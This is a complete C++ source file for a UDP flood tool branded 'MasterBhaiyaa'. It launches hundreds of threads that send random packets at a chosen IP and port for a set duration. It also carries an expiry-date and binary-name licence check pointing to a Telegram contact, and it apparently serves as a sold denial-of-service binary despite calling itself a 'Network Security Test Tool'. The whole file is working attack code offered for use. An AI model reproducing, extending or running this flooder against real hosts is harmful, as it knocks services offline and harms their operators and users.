#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define DEFAULT_PAYLOAD_SIZE 24
#define DEFAULT_THREAD_COUNT 900  // Default number of threads
#define BINARY_NAME "MasterBhaiyaa"  // Required binary name

// Expiration Date
constexpr int EXPIRATION_YEAR = 2054;
constexpr int EXPIRATION_MONTH = 11;
constexpr int EXPIRATION_DAY = 1;

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int thread_count;
    int payload_size;
};

// Blocked Ports (aligned with Python script)
bool is_blocked_port(int port) {
    static const int blocked[] = {8700, 20000, 20001, 443, 17500, 9031, 20002};
    for (int p : blocked) {
        if (port == p) return true;
    }
    return (port >= 100 && port <= 999); // Retain range-based block
}

// Signal handler for stopping
void handle_signal(int) {
    std::cout << "\n[!] Interrupt received. Stopping attack...\n";
    stop_flag = true;
}

// Generate random payload (thread-safe)
void generate_payload(std::string &buffer, size_t size, std::mt19937 &rng) {
    static const char charset[] =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()";
    buffer.resize(size);
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[dist(rng)];
    }
}

// Check expiration date
void check_expiration() {
    std::tm expiration_date = {};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;

    std::time_t now = std::time(nullptr);
    if (std::difftime(now, std::mktime(&expiration_date)) > 0) {
        std::cerr << "╔════════════════════════════════════════╗\n";
        std::cerr << "║           BINARY EXPIRED!              ║\n";
        std::cerr << "║    Please contact the owner at:        ║\n";
        std::cerr << "║    Telegram: @MasterBhaiyaa            ║\n";
        std::cerr << "╚════════════════════════════════════════╝\n";
        exit(EXIT_FAILURE);
    }
}

// Check if the binary has been renamed
void check_binary_name() {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    
    if (len != -1) {
        exe_path[len] = '\0'; // Null-terminate the string
        std::string exe_name = std::string(exe_path);
        size_t pos = exe_name.find_last_of("/");

        if (pos != std::string::npos) {
            exe_name = exe_name.substr(pos + 1);
        }

        if (exe_name != BINARY_NAME) {
            std::cerr << "╔════════════════════════════════════════╗\n";
            std::cerr << "║         INVALID BINARY NAME!           ║\n";
            std::cerr << "║    Binary must be named 'MasterBhaiyaa'║\n";
            std::cerr << "╚════════════════════════════════════════╝\n";
            exit(EXIT_FAILURE);
        }
    }
}

// Validate IP Address
bool is_valid_ip(const std::string &ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// UDP packet sending function
void udp_attack(const AttackConfig &config) {
    // Create socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "[!] Socket creation failed\n";
        return;
    }

    // Enable SO_REUSEADDR
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        std::cerr << "[!] Setsockopt failed\n";
        close(sock);
        return;
    }

    // Set up random number generator for this thread
    std::random_device rd;
    std::mt19937 rng(rd());

    // Bind to a random source port once
    sockaddr_in src_addr = {};
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY); // Use any available local address
    std::uniform_int_distribution<uint16_t> port_dist(1024, 65535);
    src_addr.sin_port = htons(port_dist(rng));

    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        std::cerr << "[!] Bind failed: " << strerror(errno) << "\n";
        close(sock);
        return;
    }

    // Set up target address
    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(static_cast<uint16_t>(config.port));
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    // Generate payload
    std::string payload;
    generate_payload(payload, config.payload_size, rng);

    // Attack loop
    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        ssize_t sent = sendto(sock, payload.c_str(), payload.size(), 0,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent < 0) {
            std::cerr << "[!] Send failed: " << strerror(errno) << "\n";
            break;
        }
    }

    close(sock);
}

// Main function
int main(int argc, char *argv[]) {
    // Initialize random seed for general use
    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    check_binary_name();
    check_expiration();

    std::cout << "╔════════════════════════════════════════╗\n";
    std::cout << "║          MasterBhaiyaa PROGRAM         ║\n";
    std::cout << "║         Copyright (c) 2024             ║\n";
    std::cout << "╚════════════════════════════════════════╝\n\n";

    if (argc < 4 || argc > 6) {
        std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [threads] [payload_size]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    try {
        config.port = std::stoi(argv[2]);
        config.duration = std::stoi(argv[3]);
        config.thread_count = (argc >= 5) ? std::stoi(argv[4]) : DEFAULT_THREAD_COUNT;
        config.payload_size = (argc == 6) ? std::stoi(argv[5]) : DEFAULT_PAYLOAD_SIZE;
    } catch (const std::exception &e) {
        std::cerr << "[!] Invalid argument: " << e.what() << "\n";
        return EXIT_FAILURE;
    }

    if (!is_valid_ip(config.ip)) {
        std::cerr << "[!] Invalid IP address: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    if (is_blocked_port(config.port)) {
        std::cerr << "[!] Port " << config.port << " is blocked!\n";
        return EXIT_FAILURE;
    }

    if (config.duration <= 0 || config.thread_count <= 0 || config.payload_size <= 0) {
        std::cerr << "[!] Duration, threads, and payload_size must be positive\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "\n=====================================\n";
    std::cout << "      Network Security Test Tool     \n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Threads: " << config.thread_count << "\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < config.thread_count; ++i) {
        threads.emplace_back(udp_attack, config);
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Security test completed successfully.\n";

    return EXIT_SUCCESS;
}